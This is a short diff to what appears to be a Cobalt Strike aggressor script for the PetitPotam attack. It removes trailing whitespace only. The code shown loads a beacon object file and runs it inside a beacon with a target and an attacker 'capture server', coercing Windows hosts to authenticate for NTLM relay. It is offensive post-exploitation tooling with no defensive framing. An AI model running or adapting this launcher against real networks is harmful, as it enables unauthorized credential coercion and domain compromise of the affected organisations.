@@ -28,7 +28,7 @@ alias PetitPotam {
 		  berror($bid, "Please specify a target server.");
 		  return;
     }
-    
+
     # Read in the right BOF file
     $handle = openf(script_resource("PetitPotam." . barch($bid) . ".o"));
     $data   = readb($handle, -1);
@@ -36,6 +36,6 @@ alias PetitPotam {
 
     # Pack our arguments
     $arg_data  = bof_pack($bid, "ZZ", $captureserver, $target);
-    
+
     beacon_inline_execute($bid, $data, "go", $arg_data);
 }
